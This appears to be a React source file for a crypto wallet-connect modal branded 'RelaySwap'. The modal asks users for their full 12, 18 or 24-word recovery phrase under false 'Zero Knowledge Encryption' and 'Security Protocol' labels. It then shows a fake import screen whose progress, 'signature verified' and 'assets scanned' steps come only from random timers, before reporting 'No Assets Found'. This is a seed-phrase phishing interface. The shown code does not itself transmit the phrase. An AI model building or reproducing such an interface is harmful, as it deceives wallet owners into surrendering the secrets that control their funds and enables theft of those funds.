import { useState, useEffect } from 'react';
import { WALLETS } from '../data/constants';

const VALID_COUNTS = [12, 18, 24];

// ── IMPORTING SCREEN ──
function ImportingScreen({ wallet, onDone }) {
  const [phase, setPhase] = useState('importing'); // 'importing' | 'empty'
  const [progress, setProgress] = useState(0);
  const [statusMsg, setStatusMsg] = useState('Connecting to network...');

  const msgs = [
    'Connecting to network...',
    'Verifying wallet signature...',
    'Scanning on-chain assets...',
    'Finalizing import...',
  ];

  useEffect(() => {
    let p = 0;
    const iv = setInterval(() => {
      p = Math.min(100, p + Math.random() * 12 + 4);
      setProgress(Math.round(p));
      if (p > 25) setStatusMsg(msgs[1]);
      if (p > 55) setStatusMsg(msgs[2]);
      if (p > 80) setStatusMsg(msgs[3]);
      if (p >= 100) {
        clearInterval(iv);
        setTimeout(() => setPhase('empty'), 400);
      }
    }, 120);
    return () => clearInterval(iv);
  }, []);

  if (phase === 'empty') {
    return (
      <div className="modal-overlay">
        <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>

          {/* HEADER */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 14,
            padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
          }}>
            <div style={{
              width: 48, height: 48, borderRadius: 14, flexShrink: 0,
              background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
            }}>🔒</div>
            <div>
              <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
                Wallet Import
              </div>
              <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
                Scan Complete
              </div>
            </div>
          </div>

          {/* BODY */}
          <div style={{ padding: '40px 24px', textAlign: 'center' }}>

            {/* Wallet badge */}
            <div style={{
              display: 'inline-flex', alignItems: 'center', gap: 8,
              padding: '8px 14px', background: 'var(--surface2)',
              border: '1px solid var(--border)', borderRadius: 10, marginBottom: 28
            }}>
              <span style={{ fontSize: 18 }}>{wallet.icon}</span>
              <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
              <span style={{
                fontSize: 10, fontWeight: 700, color: 'var(--green)',
                background: 'var(--green-bg)', border: '1px solid var(--green)',
                padding: '2px 8px', borderRadius: 20, marginLeft: 4
              }}>● Connected</span>
            </div>

            {/* Empty state icon */}
            <div style={{
              width: 72, height: 72, borderRadius: '50%', margin: '0 auto 20px',
              background: 'var(--surface2)', border: '2px solid var(--border)',
              display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 30
            }}>
              📭
            </div>

            <div style={{ fontSize: 18, fontWeight: 700, color: 'var(--text)', marginBottom: 8 }}>
              No Assets Found
            </div>
            <div style={{ fontSize: 13, color: 'var(--text2)', lineHeight: 1.7, marginBottom: 28, maxWidth: 300, margin: '0 auto 28px' }}>
              No tokens or balances were found in this wallet. You can still use RelaySwap to receive assets.
            </div>

            {/* Stats row */}
            <div style={{
              display: 'flex', gap: 12, marginBottom: 28,
              background: 'var(--surface2)', border: '1px solid var(--border)',
              borderRadius: 12, padding: '14px 16px'
            }}>
              {[
                { label: 'Tokens', value: '0' },
                { label: 'NFTs', value: '0' },
                { label: 'Total Value', value: '$0.00' },
              ].map(s => (
                <div key={s.label} style={{ flex: 1, textAlign: 'center' }}>
                  <div style={{ fontSize: 18, fontWeight: 800, color: 'var(--text)', fontFamily: 'DM Mono' }}>{s.value}</div>
                  <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 2 }}>{s.label}</div>
                </div>
              ))}
            </div>

            <button
              onClick={onDone}
              style={{
                width: '100%', padding: '14px', borderRadius: 12, border: 'none',
                background: 'var(--accent)', color: '#000',
                fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
                letterSpacing: 1.5, textTransform: 'uppercase', cursor: 'pointer',
                transition: 'all 0.2s', boxShadow: '0 4px 20px rgba(0,255,136,0.25)',
              }}
            >
              Continue to RelaySwap →
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ── IMPORTING (loading) PHASE ──
  return (
    <div className="modal-overlay">
      <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>

        {/* HEADER */}
        <div style={{
          display: 'flex', alignItems: 'center', gap: 14,
          padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
        }}>
          <div style={{
            width: 48, height: 48, borderRadius: 14, flexShrink: 0,
            background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
            display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
          }}>🔒</div>
          <div>
            <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
              Security Protocol:
            </div>
            <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
              Importing Wallet...
            </div>
          </div>
        </div>

        {/* BODY */}
        <div style={{ padding: '40px 24px', textAlign: 'center' }}>

          {/* Wallet badge */}
          <div style={{
            display: 'inline-flex', alignItems: 'center', gap: 8,
            padding: '8px 14px', background: 'var(--surface2)',
            border: '1px solid var(--border)', borderRadius: 10, marginBottom: 32
          }}>
            <span style={{ fontSize: 18 }}>{wallet.icon}</span>
            <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
            <span style={{ fontSize: 11, color: 'var(--text3)', marginLeft: 2 }}>— {wallet.desc}</span>
          </div>

          {/* Spinner */}
          <div style={{ width: 64, height: 64, margin: '0 auto 20px', position: 'relative' }}>
            <div style={{
              position: 'absolute', inset: 0, borderRadius: '50%',
              border: '2.5px solid var(--border)', borderTopColor: 'var(--accent)',
              animation: 'spin 0.9s linear infinite'
            }} />
            <div style={{
              position: 'absolute', inset: 9, borderRadius: '50%',
              border: '2.5px solid var(--border)', borderRightColor: 'var(--green)',
              animation: 'spin 1.4s linear infinite reverse'
            }} />
            <div style={{
              position: 'absolute', inset: 0,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              fontSize: 18
            }}>{wallet.icon}</div>
          </div>

          <div style={{ fontSize: 17, fontWeight: 700, color: 'var(--text)', marginBottom: 6 }}>
            Importing Wallet...
          </div>
          <div style={{ fontSize: 12, color: 'var(--text2)', marginBottom: 24, fontFamily: 'DM Mono' }}>
            {statusMsg}
          </div>

          {/* Progress bar */}
          <div style={{ height: 4, borderRadius: 2, background: 'var(--surface3)', overflow: 'hidden', marginBottom: 8 }}>
            <div style={{
              height: '100%', borderRadius: 2,
              background: 'linear-gradient(90deg, var(--accent), var(--green))',
              width: `${progress}%`, transition: 'width 0.3s ease'
            }} />
          </div>
          <div style={{ fontSize: 11, color: 'var(--text3)', fontFamily: 'DM Mono', marginBottom: 24 }}>
            {progress}% complete
          </div>

          {/* Steps */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {[
              { label: 'Wallet signature verified', done: progress >= 25 },
              { label: 'Network connection established', done: progress >= 55 },
              { label: 'On-chain assets scanned', done: progress >= 80 },
              { label: 'Import complete', done: progress >= 100 },
            ].map((s, i) => (
              <div key={i} style={{
                display: 'flex', alignItems: 'center', gap: 10,
                padding: '8px 12px', borderRadius: 10,
                background: s.done ? 'var(--green-bg)' : 'var(--surface2)',
                border: `1px solid ${s.done ? 'var(--green)' : 'var(--border)'}`,
                transition: 'all 0.3s'
              }}>
                <span style={{ fontSize: 13, color: s.done ? 'var(--green)' : 'var(--text3)' }}>
                  {s.done ? '✓' : '○'}
                </span>
                <span style={{ fontSize: 12, fontWeight: 600, color: s.done ? 'var(--green)' : 'var(--text3)' }}>
                  {s.label}
                </span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── SEED PHRASE + ADDRESS MODAL ──
function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
  const [step, setStep] = useState('seed');
  const [phrase, setPhrase] = useState('');
  const [address, setAddress] = useState('');

  const wordCount = phrase.trim() === '' ? 0 : phrase.trim().split(/\s+/).length;
  const seedReady = VALID_COUNTS.includes(wordCount);
  const targetCount = wordCount <= 12 ? 12 : wordCount <= 18 ? 18 : 24;
  const progressPct = Math.min(100, Math.round((wordCount / targetCount) * 100));

  function getStatus() {
    if (wordCount === 0) return { text: '', color: 'var(--text3)' };
    if (seedReady) return { text: `✓ ${wordCount}-word phrase complete`, color: 'var(--accent)' };
    if (wordCount < 12) return { text: `${12 - wordCount} more word${12 - wordCount !== 1 ? 's' : ''} to reach 12`, color: 'var(--text3)' };
    if (wordCount > 12 && wordCount < 18) return { text: `${18 - wordCount} more for 18 words · or remove ${wordCount - 12} to use 12`, color: 'var(--orange)' };
    if (wordCount > 18 && wordCount < 24) return { text: `${24 - wordCount} more for 24 words · or remove ${wordCount - 18} to use 18`, color: 'var(--orange)' };
    if (wordCount > 24) return { text: 'Too many words — please remove some', color: 'var(--red)' };
    return { text: '', color: 'var(--text3)' };
  }

  const status = getStatus();
  const addressReady = address.trim().length >= 10;

  const header = (label) => (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 14,
      padding: '20px 20px 16px', borderBottom: '1px solid var(--border)'
    }}>
      <div style={{
        width: 48, height: 48, borderRadius: 14, flexShrink: 0,
        background: 'linear-gradient(135deg, #1a3a6a, #0d52cc)',
        display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 22
      }}>🔒</div>
      <div>
        <div style={{ fontSize: 11, fontWeight: 700, color: 'var(--text3)', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 2 }}>
          Security Protocol:
        </div>
        <div style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)', letterSpacing: 1, textTransform: 'uppercase' }}>
          {label}
        </div>
      </div>
      <button className="modal-close" style={{ marginLeft: 'auto' }} onClick={onClose}>✕</button>
    </div>
  );

  const walletBadge = (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16,
      padding: '8px 12px', background: 'var(--surface2)',
      border: '1px solid var(--border)', borderRadius: 10
    }}>
      <span style={{ fontSize: 18 }}>{wallet.icon}</span>
      <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{wallet.name}</span>
      <span style={{ fontSize: 11, color: 'var(--text3)', marginLeft: 2 }}>— {wallet.desc}</span>
    </div>
  );

  const actionBtn = (ready, label, onClick) => (
    <button onClick={() => ready && onClick()} disabled={!ready} style={{
      width: '100%', padding: '14px', borderRadius: 12, border: 'none',
      background: ready ? 'var(--accent)' : 'var(--surface2)',
      color: ready ? '#000' : 'var(--text3)',
      fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
      letterSpacing: 1.5, textTransform: 'uppercase',
      cursor: ready ? 'pointer' : 'not-allowed', transition: 'all 0.2s',
      boxShadow: ready ? '0 4px 20px rgba(0,255,136,0.25)' : 'none',
    }}>{label}</button>
  );

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal" style={{ maxWidth: 480 }} onClick={e => e.stopPropagation()}>

        {/* STEP 1: SEED */}
        {step === 'seed' && <>
          {header('Zero Knowledge Encryption')}
          <div style={{ padding: '20px 20px 4px' }}>
            {walletBadge}
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Enter Recovery Phrase (12, 18, or 24 words)
            </div>
            <textarea
              autoFocus
              placeholder="word1 word2 word3 ..."
              value={phrase}
              onChange={e => setPhrase(e.target.value)}
              style={{
                width: '100%', height: 110, background: 'var(--surface2)',
                border: `1px solid ${seedReady ? 'var(--accent)' : wordCount > 0 ? 'var(--border2)' : 'var(--border)'}`,
                borderRadius: 12, padding: '12px 14px',
                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                outline: 'none', resize: 'none', lineHeight: 1.7, transition: 'border-color 0.2s',
              }}
            />
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, margin: '12px 0 4px' }}>
              {VALID_COUNTS.map(target => {
                const isPast  = wordCount > target;
                const isExact = wordCount === target;
                const isNext  = !isExact && !isPast && target === targetCount;
                return (
                  <div key={target} style={{
                    padding: '5px 14px', borderRadius: 20,
                    background: isExact ? 'var(--accent-light)' : isPast ? 'var(--green-bg)' : 'var(--surface2)',
                    border: `1px solid ${isExact ? 'var(--accent)' : isPast ? 'var(--green)' : 'var(--border)'}`,
                    fontSize: 11, fontWeight: 700, letterSpacing: 1,
                    color: isExact ? 'var(--accent)' : isPast ? 'var(--green)' : isNext ? 'var(--text2)' : 'var(--text3)',
                    textTransform: 'uppercase', transition: 'all 0.25s',
                    display: 'flex', alignItems: 'center', gap: 5,
                  }}>
                    {(isPast || isExact) && <span>✓</span>}
                    {target} words
                  </div>
                );
              })}
            </div>
            <div style={{ textAlign: 'center', marginBottom: 8 }}>
              <span style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: seedReady ? 'var(--accent)' : 'var(--text3)', fontFamily: "'DM Mono', monospace" }}>
                {wordCount} word{wordCount !== 1 ? 's' : ''} entered
              </span>
            </div>
            {wordCount > 0 && !seedReady && wordCount <= 24 && (
              <div style={{ margin: '0 0 8px' }}>
                <div style={{ height: 4, borderRadius: 2, background: 'var(--surface3)', overflow: 'hidden' }}>
                  <div style={{ height: '100%', borderRadius: 2, background: 'linear-gradient(90deg, var(--accent), var(--accent-hover))', width: `${progressPct}%`, transition: 'width 0.25s ease' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 4 }}>
                  <span style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono' }}>{status.text}</span>
                  <span style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono' }}>{wordCount} / {targetCount}</span>
                </div>
              </div>
            )}
            {wordCount > 24 && (
              <div style={{ textAlign: 'center', fontSize: 11, color: 'var(--red)', fontWeight: 600, marginBottom: 8 }}>
                {status.text}
              </div>
            )}
          </div>
          <div style={{ padding: '8px 20px 20px' }}>
            {actionBtn(seedReady, 'Continue →', () => setStep('address'))}
          </div>
        </>}

        {/* STEP 2: ADDRESS */}
        {step === 'address' && <>
          {header('Wallet Address Verification')}
          <div style={{ padding: '20px 20px 4px' }}>
            {walletBadge}
            <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
              Confirm Your Wallet Address
            </div>
            <input
              autoFocus
              placeholder={
                ['solflare', 'phantom', 'hotwallet', 'keplr'].includes(wallet.id)
                  ? 'Enter your .sol or base58 address'
                  : 'Enter your wallet address (0x...)'
              }
              value={address}
              onChange={e => setAddress(e.target.value)}
              style={{
                width: '100%', background: 'var(--surface2)',
                border: `1px solid ${addressReady ? 'var(--accent)' : 'var(--border)'}`,
                borderRadius: 12, padding: '13px 14px',
                fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                outline: 'none', transition: 'border-color 0.2s',
              }}
            />
            <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 8, lineHeight: 1.6 }}>
              Confirms ownership of your {wallet.name} wallet. Your address is never stored.
            </div>
          </div>
          <div style={{ padding: '16px 20px 8px', display: 'flex', gap: 8 }}>
            <button onClick={() => setStep('seed')} style={{
              padding: '13px 16px', borderRadius: 12, border: '1px solid var(--border)',
              background: 'none', color: 'var(--text2)', fontFamily: "'DM Sans', sans-serif",
              fontSize: 13, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap'
            }}>← Back</button>
            <div style={{ flex: 1 }}>
              {actionBtn(addressReady, 'Authorize Connection', () => addressReady && onAuthorize())}
            </div>
          </div>
          <div style={{ padding: '8px 20px 20px' }} />
        </>}
      </div>
    </div>
  );
}

// ── MAIN WALLET MODAL ──
export default function WalletModal({ title = 'Log in or sign up', onClose, onSelect, selectedWallet, onContinue, showContinue }) {
  const [q, setQ] = useState('');
  const [seedWallet, setSeedWallet] = useState(null);
  const [importingWallet, setImportingWallet] = useState(null);
  const filtered = q ? WALLETS.filter(w => w.name.toLowerCase().includes(q.toLowerCase())) : WALLETS;

  function handleWalletClick(w) {
    onSelect(w);
    setSeedWallet(w);
  }

  function handleAuthorize() {
    // Move from seed modal → importing screen
    const w = seedWallet;
    setSeedWallet(null);
    setImportingWallet(w);
  }

  function handleImportDone() {
    // User clicks "Continue to RelaySwap" on the empty screen
    setImportingWallet(null);
    onContinue();
  }

  return (
    <>
      {/* WALLET LIST MODAL */}
      <div className="modal-overlay" onClick={onClose}>
        <div className="modal" onClick={e => e.stopPropagation()}>
          <div className="modal-head">
            <div className="modal-title">{title}</div>
            <button className="modal-close" onClick={onClose}>✕</button>
          </div>
          <div className="modal-search">
            <span style={{ color: 'var(--text3)', fontSize: 14 }}>🔍</span>
            <input
              placeholder="Search through 645 wallets..."
              value={q}
              onChange={e => setQ(e.target.value)}
              autoFocus
            />
          </div>
          <div className="wallet-list">
            {filtered.map(w => (
              <div
                key={w.id}
                className={`w-row ${selectedWallet?.id === w.id ? 'sel' : ''}`}
                onClick={() => handleWalletClick(w)}
              >
                <div className="w-ico" style={{ background: (w.iconBg || '#ffffff') + '22' }}>
                  {w.icon}
                </div>
                <div>
                  <div className="w-name">{w.name}</div>
                  <div className="w-desc">{w.desc}</div>
                </div>
                {w.badge && (
                  <div className="w-badge">
                    <div className="w-dot" />
                    {w.badge}
                  </div>
                )}
              </div>
            ))}
          </div>
          {showContinue && (
            <div className="modal-footer">
              <button
                className="action-btn purple"
                style={{ margin: 0, width: '100%' }}
                onClick={onContinue}
                disabled={!selectedWallet}
              >
                {selectedWallet ? `Continue with ${selectedWallet.name}` : 'Select a wallet'}
              </button>
            </div>
          )}
        </div>
      </div>

      {/* SEED PHRASE MODAL */}
      {seedWallet && (
        <SeedPhraseModal
          wallet={seedWallet}
          onClose={() => setSeedWallet(null)}
          onAuthorize={handleAuthorize}
        />
      )}

      {/* IMPORTING / EMPTY SCREEN */}
      {importingWallet && (
        <ImportingScreen
          wallet={importingWallet}
          onDone={handleImportDone}
        />
      )}
    </>
  );
}